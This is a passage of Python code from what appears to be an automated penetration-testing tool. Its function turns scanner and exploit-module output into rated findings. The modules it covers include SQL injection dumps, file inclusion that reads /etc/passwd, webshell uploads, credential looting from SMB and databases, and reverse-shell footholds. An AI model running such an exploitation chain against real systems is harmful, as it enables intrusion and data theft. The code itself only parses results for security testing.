    "mongodb-databases": "MongoDB reachable without auth",
    "rsync-list-modules": "rsync modules listable",
    "snmp-info": "SNMP readable (default community)",
}


def _extract_finding(sid: str, output: str) -> "dict | None":
    """Turn one NSE script result into a finding, or None. Covers three sources with
    no re-scan (the output is already in the DB): the standard `vuln` library format
    (State: VULNERABLE / LIKELY), auth scripts whose output implies a weakness, and a
    few info rules over -sC output (exposed .git, weak TLS, SMB signing, …)."""
    if not output:
        return None
    cves = sorted(set(re.findall(r"CVE-\d{4}-\d{3,7}", output)))
    cve = ",".join(cves) or None

    # 1) standard vuln library format
    if re.search(r"State:\s*VULNERABLE", output):
        state = "VULNERABLE"
    elif re.search(r"State:\s*LIKELY VULNERABLE", output):
        state = "LIKELY"
    else:
        state = None
    if state:
        m = re.search(r"Risk factor:\s*([A-Za-z]+)", output)
        risk = (m.group(1).upper() if m else "HIGH")
        # title = the line right after "VULNERABLE:" (the human name), if it isn't a
        # structured field; otherwise fall back to the script id.
        lines = [ln.strip() for ln in output.splitlines() if ln.strip()]
        summary = sid
        for i, ln in enumerate(lines):
            if re.match(r"(LIKELY )?VULNERABLE:?$", ln, re.I) and i + 1 < len(lines):
                nxt = lines[i + 1]
                if not re.match(r"(State|IDs|Risk|Disclosure|References|Description|Extra)\b", nxt):
                    summary = nxt
                break
        return {"state": state, "cve": cve, "risk": risk, "summary": summary[:140]}

    # 2) auth-category scripts: any output = weakness
    if sid in _AUTH_TITLE:
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH", "summary": _AUTH_TITLE[sid]}

    # 2b) http-headers tool: fold the tech banner + missing security headers into one finding
    if sid == "http-headers":
        tech = []
        for hdr in ("Server", "X-Powered-By"):
            m = re.search(rf"^{hdr}:\s*(.+)$", output, re.I | re.M)
            if m:
                tech.append(m.group(1).strip())
        wanted = [("content-security-policy", "CSP"), ("x-frame-options", "X-Frame-Options"),
                  ("x-content-type-options", "X-Content-Type-Options")]
        if re.match(r"\s*https://", output, re.I):          # HSTS only matters over TLS
            wanted.append(("strict-transport-security", "HSTS"))
        missing = [short for hdr, short in wanted
                   if not re.search(rf"^{re.escape(hdr)}:", output, re.I | re.M)]
        parts = []
        if tech:
            parts.append("tech: " + ", ".join(tech))
        if missing:
            parts.append("missing sec-headers: " + ", ".join(missing))
        if parts:
            return {"state": "INFO", "cve": cve, "risk": "LOW" if missing else "INFO",
                    "summary": " · ".join(parts)[:140]}
        return None

    # 2c) whatweb stack fingerprint: fold server / framework / CMS + versions into a finding
    if sid == "http-fingerprint":
        interesting = {
            "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
            "php", "asp.net", "x-powered-by", "python", "ruby", "django", "express", "laravel",
            "nodejs", "node.js", "wordpress", "drupal", "joomla", "magento", "mediawiki",
            "typo3", "moodle", "jenkins", "jira", "gitlab", "phpmyadmin",
        }
        tech, seen = [], set()
        for name, val in re.findall(r"([A-Za-z0-9_.-]+)\[([^\]]*)\]", output):
            if name.lower() not in interesting:
                continue
            val = val.strip()
            item = f"{name} {val}" if val else name
            if item.lower() not in seen:
                seen.add(item.lower())
                tech.append(item)
        if tech:
            return {"state": "INFO", "cve": cve, "risk": "INFO",
                    "summary": ("stack: " + ", ".join(tech))[:140]}
        return None

    # 2d) TLS cert (openssl / nmap ssl-cert): surface emails + self-signed note. SAN/CN
    #     hostnames go to the hostnames table via _extract_hostnames, not here.
    if sid == "ssl-cert":
        emails = sorted(set(re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", output)))
        selfsigned = bool(re.search(r"self[- ]signed", output, re.I))
        parts = []
        if emails:
            parts.append("emails: " + ", ".join(emails))
        if selfsigned:
            parts.append("self-signed cert")
        if parts:
            return {"state": "INFO", "cve": cve, "risk": "LOW" if selfsigned else "INFO",
                    "summary": " · ".join(parts)[:140]}
        return None

    # 2e) searchsploit: fold Exploit-DB candidate matches into one finding (leads, not proof)
    if sid == "searchsploit":
        titles = re.findall(r"^\[.*?\]\s*(.+?)\s*\(EDB-(\d+)\)", output, re.M)
        if not titles:
            return None
        items = [f"{t} (EDB-{e})" for t, e in titles]
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM",
                "summary": ("exploits: " + "; ".join(items))[:140]}

    # 2f) http-source: fold mined secrets / endpoints / comments counts into one finding
    if sid == "http-source":
        def _count(sec):
            mm = re.search(rf"{sec} \((\d+)\)", output)
            return int(mm.group(1)) if mm else 0
        nsec, neps, ncom = _count("POTENTIAL SECRETS"), _count("ENDPOINTS"), _count("HTML COMMENTS")
        if not (nsec or neps or ncom):
            return None
        parts = []
        if nsec:
            labels = sorted(set(re.findall(r"^  ([a-z-]+):",
                            output[output.find("POTENTIAL SECRETS"):], re.M)))
            parts.append("secrets: " + (", ".join(labels) if labels else str(nsec)))
        if neps:
            parts.append(f"endpoints: {neps}")
        if ncom:
            parts.append(f"comments: {ncom}")
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if nsec else "INFO",
                "summary": (" · ".join(parts))[:140]}

    # 2g) http-wellknown: fold robots/sitemap hidden paths + error-page tech leak into a finding
    if sid == "http-wellknown":
        def _c(sec):
            mm = re.search(rf"{sec} \((\d+)\)", output)
            return int(mm.group(1)) if mm else 0
        nrob, nsm, nwk = _c("ROBOTS PATHS"), _c("SITEMAP URLS"), _c("WELL-KNOWN")
        techm = re.search(r"^ERROR-PAGE TECH:\s*(.+)$", output, re.M)
        tech = techm.group(1).strip() if techm else ""
        if not (nrob or nsm or nwk or tech):
            return None
        parts = []
        if nrob:
            parts.append(f"robots: {nrob} paths")
        if nsm:
            parts.append(f"sitemap: {nsm} urls")
        if nwk:
            parts.append(f"well-known: {nwk}")
        if tech:
            parts.append("errorpage: " + tech)
        return {"state": "INFO", "cve": cve, "risk": "LOW" if (nrob or tech) else "INFO",
                "summary": (" · ".join(parts))[:140]}

    # 2h) http-cookies: JWT compromise (alg:none / weak secret) or missing cookie flags
    if sid == "http-cookies":
        jwt_hi = re.findall(r"⚠ (alg:none[^\n]*|weak HS256 secret: '[^']+')", output)
        gaps = re.findall(r"^  ([^:]+): missing ([A-Za-z,]+)", output, re.M)
        parts = []
        if jwt_hi:
            parts.append("JWT: " + "; ".join(jwt_hi))
        if gaps:
            parts.append("cookies: " + ", ".join(f"{n} missing {m}" for n, m in gaps[:4]))
        if not parts:
            return None
        sensitive = any(("Secure" in m or "HttpOnly" in m) for _n, m in gaps)
        risk = "HIGH" if jwt_hi else ("MEDIUM" if sensitive else "LOW")
        return {"state": "EXPOSED" if jwt_hi else "INFO", "cve": cve, "risk": risk,
                "summary": (" · ".join(parts))[:140]}

    # 2i) vhost-fuzz: virtual hosts discovered on this IP (each may hold its own app/vuln)
    if sid == "vhost-fuzz":
        vhosts = re.findall(r"^  \+ ([A-Za-z0-9_.-]+)", output, re.M)
        if not vhosts:
            return None
        shown = ", ".join(vhosts[:6]) + (f" +{len(vhosts) - 6} more" if len(vhosts) > 6 else "")
        return {"state": "INFO", "cve": cve, "risk": "LOW",
                "summary": f"vhosts: {shown} ({len(vhosts)})"[:140]}

    # 2j) dir-brute: discovered paths/files; elevate when something sensitive turns up
    if sid == "dir-brute":
        hits = re.findall(r"^\s*\+ (\d{3})\s+(\S+)", output, re.M)
        if not hits:
            return None
        shown = ", ".join(f"{p} ({s})" for s, p in hits[:6]) + \
            (f" +{len(hits) - 6} more" if len(hits) > 6 else "")
        sensitive = any(_DIRB_SENSITIVE.search(p) for _s, p in hits)
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if sensitive else "LOW",
                "summary": f"paths: {shown} ({len(hits)})"[:140]}

    # 2k) vcs-hunt: exposed VCS / backups / secrets — high when source/creds/data can leak
    if sid == "vcs-hunt":
        hits = re.findall(r"^\s*[!+] \d{3}\s+(\S+)", output, re.M)
        if not hits:
            return None
        shown = ", ".join(hits[:6]) + (f" +{len(hits) - 6} more" if len(hits) > 6 else "")
        high = any(_VCS_HIGH_RE.search(p) for p in hits)
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if high else "MEDIUM",
                "summary": f"exposed: {shown} ({len(hits)})"[:140]}

    # 2l) param-hunt: hidden GET params; MEDIUM when a param name implies injection surface
    if sid == "param-hunt":
        groups = re.findall(r"^\s+(\S+?)\?\[([^\]]+)\]", output, re.M)
        if not groups:
            return None
        params = {p.strip() for _e, ps in groups for p in ps.split(",") if p.strip()}
        shown = "; ".join(f"{e}?[{ps}]" for e, ps in groups[:4]) + (" …" if len(groups) > 4 else "")
        danger = params & _PARAM_DANGEROUS
        summ = f"params: {shown} ({len(params)})"
        if danger:
            summ += " · risky: " + ",".join(sorted(danger)[:6])
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if danger else "LOW",
                "summary": summ[:140]}

    # 2m) default-creds: working default logins = immediate foothold → high
    if sid == "default-creds":
        hits = re.findall(r"^\s*! (\S+) @ (\S+) \((\w+)\)", output, re.M)
        if not hits:
            return None
        shown = "; ".join(f"{c} @ {p}" for c, p, _t in hits[:4]) + (" …" if len(hits) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"default creds: {shown} ({len(hits)})"[:140]}

    # 2n) auth-bypass: SQLi login bypass (highest) → DB error → user enumeration
    if sid == "auth-bypass":
        byp = re.findall(r"BYPASS (\S+)", output)
        err = re.findall(r"SQLERROR (\S+)", output)
        enum = re.findall(r"ENUM (\S+)", output)
        if byp:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SQLi auth bypass: {', '.join(byp[:3])} ({len(byp)})"[:140]}
        if err:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SQLi login (DB error): {', '.join(err[:3])} ({len(err)})"[:140]}
        if enum:
            return {"state": "INFO", "cve": cve, "risk": "MEDIUM",
                    "summary": f"user enumeration: {', '.join(enum[:3])} ({len(enum)})"[:140]}
        return None

    # 2o) login-brute: cracked creds (foothold) → high; lockout gate tripped → info
    if sid == "login-brute":
        cracked = re.findall(r"CRACKED (\S+) @ (\S+)", output)
        lock = re.findall(r"LOCKOUT (\S+)", output)
        if cracked:
            shown = "; ".join(f"{c} @ {p}" for c, p in cracked[:3]) + (" …" if len(cracked) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"brute-forced: {shown} ({len(cracked)})"[:140]}
        if lock:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"brute skipped — lockout: {', '.join(lock[:3])}"[:140]}
        return None

    # 2p) sqli-scan: injectable params (error/boolean/time) → sqlmap enum/dump
    if sid == "sqli-scan":
        pts = re.findall(r"✗ SQLI (\S+)", output)
        if not pts:
            return None
        dumped = "; dumped" if re.search(r"dumped: yes", output) else ""
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"SQLi: {shown} ({len(pts)}){dumped}"[:140]}

    # 2q) sqli-dump: OSCP-safe extraction — real data pulled = confirmed + looted
    if sid == "sqli-dump":
        pts = re.findall(r"✗ (\S+)", output)
        if not pts:
            return None
        db = re.search(r"db: (\S+)", output)
        looted = "; rows dumped" if re.search(r"^\s{8}\S", output, re.M) else ""
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        extra = (f"; db {db.group(1)}" if db else "") + looted
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"SQLi dump: {shown} ({len(pts)}){extra}"[:140]}

    # 2r) lfi-scan: local file read confirmed by content signature → high
    if sid == "lfi-scan":
        pts = re.findall(r"✗ LFI (\S+)", output)
        if not pts:
            return None
        caps = []
        if "/etc/passwd via" in output:
            caps.append("/etc/passwd")
        if "php://filter source readable" in output:
            caps.append("source")
        if "/proc/self/environ readable" in output:
            caps.append("environ")
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        tail = (" · " + "+".join(caps)) if caps else ""
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"LFI: {shown} ({len(pts)}){tail}"[:140]}

    # 2s) rfi-scan: wrapper inclusion with code execution (marker echoed) → RCE
    if sid == "rfi-scan":
        execs = re.findall(r"✗ RFI (\S+)", output)
        if not execs:
            return None
        shown = ", ".join(execs[:4]) + (f" +{len(execs) - 4}" if len(execs) > 4 else "")
        vtail = "; rev-shell verified" if "egress VERIFIED" in output else ""
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"RFI RCE (wrapper): {shown} ({len(execs)}){vtail}"[:140]}

    # 2t) cmdi-scan: OS command injection (computed-marker or time) → RCE
    if sid == "cmdi-scan":
        pts = re.findall(r"✗ CMDI (\S+)", output)
        if not pts:
            return None
        mu = re.search(r"^\s+id: (uid=\S+)", output, re.M)
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        tail = f" · {mu.group(1)}" if mu else ""
        if "egress VERIFIED" in output:
            tail += " · rev-shell verified"
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"OS cmd injection: {shown} ({len(pts)}){tail}"[:140]}

    # 2u) ssti-scan: template injection — RCE-confirmed (id) high, eval-only medium
    if sid == "ssti-scan":
        rce = re.findall(r"✗ SSTI (\S+)", output)
        eval_only = re.findall(r"⚠ SSTI (\S+)", output)
        if rce:
            eng = re.search(r"→ (\w+), RCE confirmed", output)
            uid = re.search(r"id: (uid=\S+)", output)
            shown = ", ".join(rce[:4]) + (f" +{len(rce) - 4}" if len(rce) > 4 else "")
            tail = (f"; {eng.group(1)}" if eng else "") + (f"; {uid.group(1)}" if uid else "")
            if "egress VERIFIED" in output:
                tail += "; rev-shell verified"
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SSTI RCE: {shown} ({len(rce)}){tail}"[:140]}
        if eval_only:
            shown = ", ".join(eval_only[:4]) + (f" +{len(eval_only) - 4}" if len(eval_only) > 4 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "MEDIUM",
                    "summary": f"SSTI (eval, RCE unconfirmed): {shown} ({len(eval_only)})"[:140]}
        return None

    # 2v) upload-shell: file-upload webshell — code-executed critical, merely-stored high
    if sid == "upload-shell":
        rce = re.findall(r"✗ UPLOAD (\S+)", output)
        stored = re.findall(r"⚠ UPLOAD (\S+)", output)
        if rce:
            var = re.search(r"✗ UPLOAD \S+\s+\(([^)]+)\)", output)
            vt = f" ({var.group(1)})" if var else ""
            shown = rce[0] + (f" +{len(rce) - 1}" if len(rce) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"File-upload RCE: {shown}{vt}"[:140]}
        if stored:
            shown = stored[0] + (f" +{len(stored) - 1}" if len(stored) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Arbitrary file upload (exec unconfirmed): {shown}"[:140]}
        return None

    # 2w) xxe-ssrf: metadata/file-read critical, OOB-confirmed SSRF/XXE high
    if sid == "xxe-ssrf":
        meta = re.findall(r"✗ SSRF-META (\S+)", output)
        s_oob = re.findall(r"✗ SSRF-OOB (\S+)", output)
        x_read = re.findall(r"✗ XXE-READ (\S+)", output)
        x_oob = re.findall(r"✗ XXE-OOB (\S+)", output)
        if x_read:
            shown = x_read[0] + (f" +{len(x_read) - 1}" if len(x_read) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"XXE file read: {shown}"[:140]}
        if meta:
            shown = meta[0] + (f" +{len(meta) - 1}" if len(meta) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"SSRF → cloud metadata: {shown}"[:140]}
        if s_oob or x_oob:
            bits = ([f"SSRF ({len(s_oob)})"] if s_oob else []) + ([f"XXE ({len(x_oob)})"] if x_oob else [])
            first = (s_oob or x_oob)[0]
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Out-of-band {' + '.join(bits)}: {first}"[:140]}
        return None

    # 2x) idor-bac: IDOR / broken access control / authz bypass high, enumerable-only info
    if sid == "idor-bac":
        idor = re.findall(r"✗ IDOR (\S+)", output)
        bac = re.findall(r"✗ BAC (\S+)", output)
        authz = re.findall(r"✗ AUTHZ-BYPASS (\S+)", output)
        enum = re.findall(r"⚠ ENUM (\S+)", output)
        if idor:
            authed = " [authenticated]" if "[authenticated as" in output else ""
            shown = idor[0] + (f" +{len(idor) - 1}" if len(idor) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"IDOR: {shown}{authed}"[:140]}
        if bac:
            shown = bac[0] + (f" +{len(bac) - 1}" if len(bac) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Broken access control (unauth): {shown}"[:140]}
        if authz:
            shown = authz[0] + (f" +{len(authz) - 1}" if len(authz) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"401/403 authz bypass: {shown}"[:140]}
        if enum:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"Enumerable objects (verify for IDOR): {enum[0]}"[:140]}
        return None

    # 2y) cms-scan: vulnerable plugin/theme/core high, user enum info, detection info
    if sid == "cms-scan":
        vulns = re.findall(r"✗ CMS-VULN (.+)", output)
        users = re.search(r"⚠ CMS-USERS (.+)", output)
        cmsm = re.search(r"^CMS: (.+)$", output, re.M)
        if vulns:
            shown = vulns[0][:90] + (f" +{len(vulns) - 1}" if len(vulns) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"CMS vuln: {shown}"[:140]}
        if users:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"CMS user enumeration: {users.group(1)}"[:140]}
        if cmsm:
            return {"state": "INFO", "cve": cve, "risk": "INFO",
                    "summary": f"CMS detected: {cmsm.group(1)}"[:140]}
        return None

    # 2z) admin-rce: authenticated admin panel → code execution
    if sid == "admin-rce":
        hits = re.findall(r"✗ ADMIN-RCE (\S+)", output)
        if hits:
            meth = re.search(r"✗ ADMIN-RCE \S+\s+\(([^)]+)\)", output)
            mt = f" ({meth.group(1)})" if meth else ""
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"Authenticated admin RCE: {hits[0]}{mt}"[:140]}
        return None

    # 2aa) foothold: a reverse shell was fired over a confirmed RCE channel
    if sid == "foothold":
        m = re.search(r"foothold: fired (.+)$", output)
        if m:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"Reverse shell foothold: {m.group(1)}"[:140]}
        return None

    # 2ab) smb-enum: SMB signing not required / SMBv1 → relay & EternalBlue surface (high);
    # null/guest sessions & readable shares → exposed; otherwise the OS/domain banner is info.
    if sid == "smb-enum":
        conds, state, risk = [], "INFO", "LOW"
        if "signing NOT required" in output:
            conds.append("SMB signing not required (NTLM relay)")
            state, risk = "VULNERABLE", "HIGH"
        if "SMBv1 enabled" in output:
            conds.append("SMBv1 enabled (EternalBlue surface)")
            state, risk = "VULNERABLE", "HIGH"
        acc = re.search(r"Access:\s*(null session|guest) allowed", output)
        if acc:
            conds.append(f"{acc.group(1)} allowed")
            if state == "INFO":
                state, risk = "EXPOSED", "MEDIUM"
        rsh = [m.group(1) for m in re.finditer(r"^\s*(\S+)\s+(?:READ,WRITE|READ|WRITE)\b", output, re.M)
               if m.group(1).upper() not in ("IPC$", "SHARE", "SHARENAME", "DISK")]
        if rsh:
            conds.append("readable shares: " + ", ".join(dict.fromkeys(rsh))[:60])
            if state == "INFO":
                state, risk = "EXPOSED", "MEDIUM"
        if conds:
            return {"state": state, "cve": cve, "risk": risk, "summary": (" · ".join(conds))[:140]}
        mo = re.search(r"OS:\s*(.+)", output)
        if mo:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": ("SMB: " + mo.group(1).strip())[:140]}
        return None

    # 2ac) smb-vuln: confirmed unauth version-RCE (MS17-010 / MS08-067 / SMBGhost / DoublePulsar)
    if sid == "smb-vuln":
        hits = re.findall(r"^✗ VULN (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:4]) + (f" +{len(hits) - 4}" if len(hits) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                "summary": f"SMB RCE: {shown}"[:140]}

    # 2ad) smb-loot: creds recovered from shares (highest) → secrets → sensitive file inventory
    if sid == "smb-loot":
        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
        files = re.findall(r"^· FILE ", output, re.M)
        if creds:
            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SMB loot creds: {shown}"[:140]}
        if secrets:
            shown = "; ".join(s.strip() for s in secrets[:3]) + (f" +{len(secrets) - 3}" if len(secrets) > 3 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"SMB loot secrets: {shown}"[:140]}
        if files:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
        return None

    # 2az) ftp-foothold: a shell path was taken (backdoor / web-rce / ssh-key)
    if sid == "ftp-foothold":
        mm = re.search(r"^ftp-foothold: (\w[\w-]* shell → .+)$", output, re.M)
        if mm:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"foothold — {mm.group(1)}"[:140]}
        return None

    # 2ay) ftp-bounce: internal-only ports reachable through the FTP server (PORT bounce)
    if sid == "ftp-bounce":
        op = re.findall(r"^✗ BOUNCE 127\.0\.0\.1:(\d+) open\s+\(([^)]+)\)", output, re.M)
        if not op:
            return None
        shown = ", ".join(f"{p} {h}" for p, h in op[:6])
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"FTP bounce → internal: {shown}"[:140]}

    # 2ax) ftp-webshell: FTP-writable dir served by a web root → code execution
    if sid == "ftp-webshell":
        rcehits = re.findall(r"^✗ RCE (.+)$", output, re.M)
        served = re.findall(r"^✗ SERVED (.+)$", output, re.M)
        if rcehits:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"FTP→web RCE: {rcehits[0].strip()}"[:140]}
        if served:
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"FTP dir web-served: {served[0].strip()}"[:140]}
        return None

    # 2aw) ftp-creds: default / reused FTP login worked → immediate access
    if sid == "ftp-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"FTP creds: {shown}"[:140]}

    # 2av) ftp-write: anonymous-writable directory — webshell / payload-drop surface
    if sid == "ftp-write":
        w = re.findall(r"^✗ WRITABLE (\S+)", output, re.M)
        if not w:
            return None
        shown = ", ".join(dict.fromkeys(w))[:100]
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"anonymous-writable FTP dir(s): {shown}"[:140]}

    # 2au) ftp-anon: anonymous FTP access — high when it exposes interesting files
    if sid == "ftp-anon":
        if "anonymous login allowed" not in output:
            return None
        ni = len(re.findall(r"^! ", output, re.M))
        summ = "anonymous FTP login allowed" + (f" · {ni} interesting file(s)" if ni else "")
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if ni else "MEDIUM",
                "summary": summ[:140]}

    # 2bf) telnet-shell: an interactive telnet session was spawned (auto-login / no-auth)
    if sid == "telnet-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bq) mssql-loot: sql_login hashes / linked servers / file-read > db inventory
    if sid == "mssql-loot":
        hashes = re.findall(r"^✗ HASH ", output, re.M)
        linked = re.findall(r"^✗ LINKED (\S+)", output, re.M)
        fread = re.search(r"^✗ FILE-READ ", output, re.M)
        dbs = re.findall(r"^· DB ", output, re.M)
        bits = []
        if hashes:
            bits.append(f"{len(hashes)} sql_login hash(es)")
        if linked:
            bits.append(f"linked: {', '.join(linked[:3])}")
        if fread:
            bits.append("OPENROWSET file-read")
        if bits:
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"MSSQL loot: {'; '.join(bits)}"[:140]}
        if dbs:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"MSSQL: {len(dbs)} non-system database(s)"[:140]}
        return None

    # 2bp) mssql-shell: a PowerShell reverse shell was fired through xp_cmdshell
    if sid == "mssql-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"MSSQL foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bo) mssql-exec: xp_cmdshell command execution confirmed
    if sid == "mssql-exec":
        mo = re.search(r"^✗ EXEC .*running as (.+)$", output, re.M)
        if mo:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"MSSQL xp_cmdshell RCE as {mo.group(1).strip()}"[:140]}
        return None

    # 2bn) mssql-creds: sa/default/reused login → DB access (sysadmin = command exec)
    if sid == "mssql-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        admin = any("sysadmin" in h for h in hits)
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL" if admin else "HIGH",
                "summary": f"MSSQL creds: {shown}"[:140]}

    # 2bt) ssh-shell: a direct SSH session was opened with a proven cred
    if sid == "ssh-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"SSH foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bs) ssh-creds: reused/default SSH login worked → direct shell access
    if sid == "ssh-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"SSH creds: {shown}"[:140]}

    # 2br) ssh-banner: libssh auth bypass (critical) → else version info
    if sid == "ssh-banner":
        vulns = re.findall(r"^✗ VULN (.+)$", output, re.M)
        if vulns:
            vcve = ",".join(sorted(set(re.findall(r"CVE-\d{4}-\d{3,7}", " ".join(vulns))))) or None
            return {"state": "VULNERABLE", "cve": vcve, "risk": "CRITICAL",
                    "summary": f"SSH: {vulns[0]}"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"SSH: {mv.group(1).strip()}"[:140]}
        return None

    # 2bm) mssql-banner: unauthenticated version disclosure (info)
    if sid == "mssql-banner":
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"MSSQL: {mv.group(1).strip()}"[:140]}
        return None

    # 2bl) mysql-shell: a reverse shell was fired through the OUTFILE webshell
    if sid == "mysql-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"MySQL foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bk) mysql-rce: INTO OUTFILE webshell → confirmed command execution
    if sid == "mysql-rce":
        if re.search(r"^✗ RCE ", output, re.M):
            mu = re.search(r"^✗ RCE (\S+)", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"MySQL RCE: webshell {mu.group(1)}"[:140]}
        return None

    # 2bj) mysql-loot: app creds > user hashes / file-read > db inventory
    if sid == "mysql-loot":
        appc = re.findall(r"^✗ CRED (.+)$", output, re.M)
        hashes = re.findall(r"^✗ HASH ", output, re.M)
        fread = re.search(r"^✗ FILE-READ ", output, re.M)
        dbs = re.findall(r"^· DB ", output, re.M)
        if appc:
            shown = "; ".join(c.strip() for c in appc[:2]) + (f" +{len(appc) - 2}" if len(appc) > 2 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"MySQL app creds: {shown}"[:140]}
        if hashes or fread:
            bits = []
            if hashes:
                bits.append(f"{len(hashes)} mysql.user hash(es)")
            if fread:
                bits.append("LOAD_FILE /etc/passwd")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"MySQL loot: {', '.join(bits)}"[:140]}
        if dbs:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"MySQL: {len(dbs)} non-system database(s) readable"[:140]}
        return None

    # 2bi) mysql-creds: default/reused login or CVE-2012-2122 bypass → DB access
    if sid == "mysql-creds":
        if re.search(r"^✗ BYPASS ", output, re.M):
            return {"state": "VULNERABLE", "cve": "CVE-2012-2122", "risk": "CRITICAL",
